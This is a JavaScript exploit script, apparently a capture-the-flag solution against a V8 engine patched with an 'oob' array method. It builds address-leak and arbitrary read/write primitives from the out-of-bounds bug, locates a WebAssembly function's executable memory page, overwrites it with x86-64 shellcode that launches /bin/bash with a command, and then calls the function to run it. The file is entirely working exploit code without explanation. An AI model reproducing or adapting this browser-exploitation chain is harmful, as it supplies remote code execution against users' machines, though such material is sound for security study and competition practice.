var output = "";
function print(str)
{
    output += str + "<br>";
    document.getElementById("out").innerHTML = output;
}

function pwn() {
    let conva = new ArrayBuffer(8); // 8 bytes
    let convi = new Uint32Array(conva);
    let convf = new Float64Array(conva);

    let fti = (f) => {  // <-- eat a float
        convf[0] = f;
        let b = BigInt(convi[0]) + (BigInt(convi[1]) << 32n);
        return b;
    }

    let itf = (i) => {  // <-- eat a BigInt
        convi[0] = Number(i&0xffffffffn);
        convi[1] = Number(i>>32n);
        return convf[0];
    }
    
    /* pwn start from here */
    
    var leakb = new Array(1.1,2.2,3.3);
    var b = new ArrayBuffer(100);
    var arr_buf_map = leakb.oob();

    function leak(addr){
        let a = new Array(1.1,2.2,3.3, 4.4); // for changing objA to array buffer
        let objA = {"a":itf(1000n), "c":itf(BigInt(addr))}; // "a" for buffer length, "c" for address
        a.oob(arr_buf_map);
        let test = new Float64Array(objA,0,100);
        return fti(test[0]);
    }

    function write(addr, val){
        let a = new Array(1.1,2.2,3.3, 4.4); // for changing objA to array buffer
        let objA = {"a":itf(1000n), "c":itf(BigInt(addr))}; // "a" for buffer length, "b" for address
        a.oob(arr_buf_map);
        let test = new Float64Array(objA,0,100);
        test[0] = itf(BigInt(val));
    }

    function addrof(obj){
        let z = new Array(1.1,2.2,3.3); // for changing objZ to array buffer
        let objZ = {"a":itf(1000n), "b":{"c":obj}}; // for leaking object addr
        z.oob(arr_buf_map);
        let shit = new Float64Array(objZ,0,100);
        addr_low = fti(shit[2])>>56n;
        addr_high = (fti(shit[3])&0xffffffffffffn)<<8n;
        ret = (addr_high | addr_low); // function object address
        return ret;
    }

	const wasm_simple = [0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x08, 0x02, 0x60, 0x01, 0x7f, 0x00, 0x60, 0x00, 0x00, 0x02, 0x19, 0x01, 0x07, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x73, 0x0d, 0x69, 0x6d, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x00, 0x00, 0x03, 0x02, 0x01, 0x01, 0x07, 0x11, 0x01, 0x0d, 0x65, 0x78, 0x70, 0x6f, 0x72, 0x74, 0x65, 0x64, 0x5f, 0x66, 0x75, 0x6e, 0x63, 0x00, 0x01, 0x0a, 0x08, 0x01, 0x06, 0x00, 0x41, 0x2a, 0x10, 0x00, 0x0b];

	let wasm_buffer = new ArrayBuffer(wasm_simple.length);
	const wasm_buf8 = new Uint8Array(wasm_buffer);
	for (var i = 0 ; i < wasm_simple.length ; ++i) {
		wasm_buf8[i] = wasm_simple[i];
	}

	let rwx_page_addr = undefined;

    var wasm_importObject = {
        imports: {
            imported_func: function(arg) {
                // wasm_function -> shared_info -> mapped_pointer -> start_of_rwx_space
                let a = addrof(wasm_func);
                //alert("wasm: 0x"+a.toString(16));
                a -= 1n;
                a += 0x18n;
                a = leak(a);
                a -= 0x109n;
                a = leak(a);
                rwx_page_addr = a;
                //alert("rwx: 0x"+rwx_page_addr.toString(16))
                //console.log("    + rwx_page_addr = " + rwx_page_addr.hex());
                stages_after_wasm();
            }
        }
    };

    async function wasm_trigger() {
        let result = await WebAssembly.instantiate(wasm_buffer, wasm_importObject);
        return result;
    }

    let wasm_func = undefined;
    
	let shellcode = [
0x6e69622fb848686an,
0xe78948507361622fn,
0x2434810101313b68n,
0x4944b84801010101n,
0x31503d59414c5053n,
0xe201485a086a52d2n,
0x62612f68e2894852n,
0x2f20746964b84863n,
0x2f72b84850706d74n,
0x485065672f6e6962n,
0x752f2026262063b8n,
0x6d742f20b8485073n,
0x74b8485062612f70n,
0x503e2067616c665fn,
0x10101010101b848n,
0x2c0169b848500101n,
0x4314864662e0162n,
0x2f6e69622fb84824n,
0x6a56f63150736162n,
0x1a6a56e601485e15n,
0x5e186a56e601485en,
0x6ae6894856e60148n,
0x90909090050f583bn,

];


    wasm_trigger().then(r => {
        f = r.instance.exports.exported_func;
        wasm_func = f;
        f(); });

    function stages_after_wasm(){
        for (var i = 0 ; i < shellcode.length ; ++i ) {
            let a = rwx_page_addr + (BigInt(i) * 8n);
            write(a, shellcode[i]);
        }
        wasm_func();
    }
}

pwn();
